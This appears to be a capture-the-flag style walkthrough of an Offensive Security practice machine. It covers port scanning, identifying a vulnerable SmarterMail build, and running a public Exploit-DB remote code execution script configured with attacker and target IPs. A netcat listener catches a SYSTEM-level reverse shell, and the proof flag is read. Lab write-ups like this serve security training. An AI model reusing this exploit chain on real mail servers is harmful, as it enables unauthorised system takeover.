---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# discovery

Performing a full `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- -sV 192.168.162.65
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 14:26 EST
Nmap scan report for 192.168.162.65
Host is up (0.029s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
7680/tcp  open  tcpwrapped
9998/tcp  open  http          Microsoft IIS httpd 10.0
17001/tcp open  remoting      MS .NET Remoting services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.25 seconds
```

## smartermail
Different smartermail services are available on the machine
- 'normal' web interface on 9998
- `API` interface on port 17001
- `FTP` interface on port 21
- blank page on port 80

The smartermail version is exposed via the source code of the login page:
```javascript
...
<script>
		var htmlCacheBustQs = "cachebust=100.0.6919.30414.8d65fc3f1d47d00";
		var languageCacheBustQs = "cachebust=8d65fc3f1d47d00";
		var angularLangList = ['cs','da','de','en','en-GB','es','fa','fr','it','nl','pt','pt-BR','sv','tr','zh-CN','zh-HK','zh-TW'];
		var angularLangMap = {'cs': 'cs', 'da': 'da', 'de': 'de', 'en': 'en', 'en-GB': 'en-GB', 'es': 'es', 'fa': 'fa', 'fr': 'fr', 'it': 'it', 'nl': 'nl', 'pt': 'pt', 'pt-BR': 'pt-BR', 'sv': 'sv', 'tr': 'tr', 'zh-CN': 'zh-CN', 'zh-HK': 'zh-HK', 'zh-TW': 'zh-TW', 'cs*': 'cs', 'da*': 'da', 'de*': 'de', 'en*': 'en', 'es*': 'es', 'fa*': 'fa', 'fr*': 'fr', 'it*': 'it', 'nl*': 'nl', 'pt*': 'pt', 'sv*': 'sv', 'tr*': 'tr', 'zh*': 'zh-CN'};
		var angularLangNames = [{v:'cs',n:'čeština'},{v:'da',n:'dansk'},{v:'de',n:'Deutsch'},{v:'en',n:'English'},{v:'en-GB',n:'English (United Kingdom)'},{v:'es',n:'español'},{v:'fa',n:'فارسی'},{v:'fr',n:'français'},{v:'it',n:'italiano'},{v:'nl',n:'Nederlands'},{v:'pt',n:'português'},{v:'pt-BR',n:'português (Brasil)'},{v:'sv',n:'svenska'},{v:'tr',n:'Türkçe'},{v:'zh-CN',n:'中文(中国)'},{v:'zh-HK',n:'中文(香港特別行政區)'},{v:'zh-TW',n:'中文(台灣)'}];
		var cssVersion = "100.0.6919.30414.8d65fc3f1d47d00";
		var stProductVersion = "100.0.6919";
		var stProductBuild = "6919 (Dec 11, 2018)";
		var stSiteRoot = "/";
		var stThemeVersion = "100.0.6919.30414.8d65fc3f1d47d00";
		var debugMode = 0;

		function cachebust(url) {
			if (!url) return null;
			var separator = url.indexOf("?")==-1 ? "?" : "&";
			return url + separator + htmlCacheBustQs;
		}
	</script>
...
```
> Smartermail version 6919 (Dec 11, 2018)
{: .prompt-info }

---

# exploitation
## general
- `FTP` allows anonynmous login
- `log` files available on the server

## looking for smartermail exploits
```bash
$ searchsploit smartermail
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
SmarterMail 16 - Arbitrary File Upload                                                                                                          | multiple/webapps/48580.py
SmarterMail 7.1.3876 - Directory Traversal                                                                                                      | windows/remote/15048.txt
SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                                                                  | asp/webapps/16955.txt
SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                                                                                 | asp/webapps/16975.txt
SmarterMail < 7.2.3925 - LDAP Injection                                                                                                         | asp/webapps/15189.txt
SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                                                                        | asp/webapps/15185.txt
SmarterMail Build 6985 - Remote Code Execution                                                                                                  | windows/remote/49216.py
SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                                                                      | asp/webapps/31017.php
smartermail free 9.2 - Persistent Cross-Site Scripting                                                                                          | windows/webapps/20362.py
SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                                                                                         | php/webapps/31240.txt
SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service                                                                          | windows/dos/31607.py
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
> `smarterMail Build 6985 - Remote Code Execution`: `windows/remote/49216.py`
{: .prompt-info }

## configurate the exploit

This exploit abuses a vulnerability in the `API` on port 17001.

```python
...
HOST='192.168.187.65'
PORT=17001
LHOST='192.168.49.187'
LPORT=445
...
```

## exploit the server
### start listener on attacker machine
```bash
$ nc -nlvp 445
listening on [any] 445 ...
```

### execute the exploit
```bash
$ python3 49216.py
```

### catch connect from target server
```bash
nc -nlvp 445
listening on [any] 445 ...
connect to [192.168.49.187] from (UNKNOWN) [192.168.187.65] 49688
whoami
nt authority\system
PS C:\Windows\system32>
```

> Yes! We got a shell.
{: .prompt-info }

---

# post exploitation
## get the flag
```bash
PS C:\users\administrator\Desktop> type proof.txt
7******************************e
```

Pwned! <@:-)
